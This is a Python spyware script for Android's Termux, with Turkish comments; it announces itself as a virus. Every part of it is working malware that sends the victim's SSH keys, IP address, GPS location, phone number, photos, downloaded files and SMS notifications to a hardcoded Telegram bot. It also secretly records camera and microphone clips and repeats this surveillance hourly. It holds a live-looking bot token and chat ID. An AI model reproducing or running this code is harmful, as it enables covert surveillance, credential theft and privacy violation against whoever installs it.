#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import time
import requests
import subprocess
import glob
import hashlib
import threading
import json
import shutil

TOKEN = "8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0"
ADMIN_ID = "8402048380"

# ======================== TELEGRAM GÖNDERİCİLER ========================
def mesaj(m):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      data={"chat_id": ADMIN_ID, "text": m[:4000]}, timeout=10)
    except:
        pass

def foto(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                          data={"chat_id": ADMIN_ID}, files={"photo": f}, timeout=30)
    except:
        pass

def dosya_gonder(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                          data={"chat_id": ADMIN_ID}, files={"document": f}, timeout=30)
    except:
        pass

def video_gonder(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo",
                          data={"chat_id": ADMIN_ID}, files={"video": f}, timeout=60)
    except:
        pass

def ses_gonder(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendAudio",
                          data={"chat_id": ADMIN_ID}, files={"audio": f}, timeout=60)
    except:
        pass

def konum_gonder(lat, lon):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendLocation",
                      data={"chat_id": ADMIN_ID, "latitude": lat, "longitude": lon}, timeout=10)
    except:
        pass

# ======================== 1. SİSTEM BİLGİSİ ========================
def sistem_bilgisi():
    try:
        host = subprocess.check_output(["uname", "-n"], text=True).strip()
        user = subprocess.check_output(["whoami"], text=True).strip()
        ip = requests.get('https://api.ipify.org', timeout=5).text
        mesaj(f"💻 SİSTEM: {host} | {user} | IP: {ip}")
    except:
        mesaj("❌ Sistem bilgisi alınamadı.")

# ======================== 2. SSH ANAHTARLARI ========================
def ssh_anahtarlari():
    try:
        ssh_dosyalari = glob.glob(os.path.expanduser("~/.ssh/*"))
        if ssh_dosyalari:
            for dosya in ssh_dosyalari:
                dosya_gonder(dosya)
            mesaj(f"🔐 SSH dosyaları gönderildi: {', '.join([os.path.basename(f) for f in ssh_dosyalari])}")
        else:
            mesaj("❌ SSH dosyası bulunamadı.")
    except:
        mesaj("❌ SSH hatası.")

# ======================== 3. KONUM ========================
def konum():
    try:
        mesaj("📍 Konum alınıyor...")
        veri = subprocess.check_output(["termux-location"], text=True, timeout=10)
        if veri:
            try:
                j = json.loads(veri)
                lat = j.get("latitude", 0)
                lon = j.get("longitude", 0)
                if lat and lon:
                    konum_gonder(lat, lon)
                    mesaj(f"📍 Konum: {lat}, {lon}")
                else:
                    mesaj("❌ Konum verisi boş.")
            except:
                mesaj(f"📍 Konum: {veri[:200]}")
        else:
            mesaj("❌ Konum alınamadı (GPS kapalı).")
    except:
        mesaj("❌ Konum hatası (Termux:API yok).")

# ======================== 4. TELEFON NUMARASI ========================
def telefon_numarasi():
    try:
        numara = subprocess.check_output(["termux-telephony-callinfo"], text=True, timeout=5)
        if numara:
            mesaj(f"📞 NUMARA: {numara[:200]}")
            return
    except:
        pass
    try:
        numara = subprocess.check_output(["settings", "get", "global", "phone_number"], text=True, timeout=5).strip()
        if numara:
            mesaj(f"📞 NUMARA: {numara}")
            return
    except:
        pass
    mesaj("❌ Numara alınamadı (root gerekli).")

# ======================== 5. İLK 15 FOTOĞRAF ========================
def ilk_fotolar():
    mesaj("📸 İLK 15 FOTOĞRAF GÖNDERİLİYOR...")
    say = 0
    for klasor in ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures"]:
        if not os.path.exists(klasor):
            continue
        for dosya in os.listdir(klasor)[:15]:
            yol = os.path.join(klasor, dosya)
            if os.path.isfile(yol) and dosya.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                foto(yol)
                say += 1
                time.sleep(0.3)
    mesaj(f"✅ {say} fotoğraf gönderildi. Devamı arkada...")

# ======================== 6. TÜM GALERİ ========================
def galeri():
    mesaj("📸 GALERİ TARANIYOR...")
    say = 0
    for klasor in ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures"]:
        if not os.path.exists(klasor):
            continue
        for root, _, files in os.walk(klasor):
            for dosya in files:
                if dosya.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    foto(os.path.join(root, dosya))
                    say += 1
                    time.sleep(0.2)
    mesaj(f"✅ {say} fotoğraf gönderildi.")

# ======================== 7. DOSYALAR (DOWNLOADS) ========================
def dosyalar():
    mesaj("📁 DOSYALAR TARANIYOR...")
    say = 0
    for klasor in ["/storage/emulated/0/Download"]:
        if not os.path.exists(klasor):
            continue
        for dosya in os.listdir(klasor):
            yol = os.path.join(klasor, dosya)
            if os.path.isfile(yol):
                dosya_gonder(yol)
                say += 1
                time.sleep(0.2)
    mesaj(f"✅ {say} dosya gönderildi.")

# ======================== 8. SMS BİLDİRİM ========================
def sms_izle():
    mesaj("📨 SMS BİLDİRİM İZLEYİCİ BAŞLADI...")
    eski = []
    while True:
        try:
            sonuc = subprocess.check_output(["termux-notification-list"], text=True, timeout=5)
            if sonuc and sonuc not in eski:
                eski.append(sonuc)
                if "sms" in sonuc.lower() or "message" in sonuc.lower():
                    mesaj(f"📨 SMS: {sonuc[:600]}")
        except:
            pass
        time.sleep(3)

# ======================== 9. DOSYA İZLEYİCİ ========================
def dosya_izle():
    klasorler = ["/storage/emulated/0/Download", "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures"]
    hash_kayit = {}
    while True:
        for klasor in klasorler:
            if not os.path.exists(klasor):
                continue
            for dosya in os.listdir(klasor):
                yol = os.path.join(klasor, dosya)
                if os.path.isfile(yol):
                    try:
                        with open(yol, "rb") as f:
                            h = hashlib.md5(f.read()).hexdigest()
                        if h not in hash_kayit:
                            hash_kayit[h] = yol
                            mesaj(f"📁 YENİ DOSYA: {yol}")
                            if yol.lower().endswith(('.jpg', '.png', '.jpeg', '.gif')):
                                foto(yol)
                            else:
                                dosya_gonder(yol)
                    except:
                        pass
        time.sleep(10)

# ======================== 10. KAMERA KAYDI ========================
def kamera_kaydet():
    try:
        mesaj("📸 KAMERA KAYDI BAŞLATILIYOR...")
        dosya = "/sdcard/video.mp4"
        subprocess.run(["termux-camera-record", "-c", "0", "-d", "10", "-f", dosya], timeout=15)
        if os.path.exists(dosya):
            video_gonder(dosya)
            os.remove(dosya)
            mesaj("✅ Kamera kaydı gönderildi.")
        else:
            mesaj("❌ Kamera kaydı başarısız.")
    except:
        mesaj("❌ Kamera hatası (Termux:API yok).")

# ======================== 11. MİKROFON KAYDI ========================
def mikrofon_kaydet():
    try:
        mesaj("🎤 MİKROFON KAYDI BAŞLATILIYOR...")
        dosya = "/sdcard/ses.mp3"
        subprocess.run(["termux-microphone-record", "-d", "10", "-f", dosya], timeout=15)
        if os.path.exists(dosya):
            ses_gonder(dosya)
            os.remove(dosya)
            mesaj("✅ Mikrofon kaydı gönderildi.")
        else:
            mesaj("❌ Mikrofon kaydı başarısız.")
    except:
        mesaj("❌ Mikrofon hatası (Termux:API yok).")

# ======================== ANA ========================
def ana():
    mesaj("🚀 VİRÜS AKTİF! BAŞLIYOR...")
    sistem_bilgisi()
    time.sleep(2)
    ssh_anahtarlari()
    time.sleep(2)
    konum()
    time.sleep(2)
    telefon_numarasi()
    time.sleep(2)
    ilk_fotolar()
    time.sleep(2)
    kamera_kaydet()
    time.sleep(2)
    mikrofon_kaydet()
    time.sleep(2)

    threading.Thread(target=galeri, daemon=True).start()
    threading.Thread(target=dosyalar, daemon=True).start()
    threading.Thread(target=sms_izle, daemon=True).start()
    threading.Thread(target=dosya_izle, daemon=True).start()

    mesaj("✅ SÜREKLİ İZLEME BAŞLADI...")
    while True:
        time.sleep(3600)
        mesaj("⏰ 1 SAAT GEÇTİ. KONUM, KAMERA, MİKROFON TEKRAR BAŞLATILIYOR...")
        konum()
        kamera_kaydet()
        mikrofon_kaydet()

if __name__ == "__main__":
    ana()
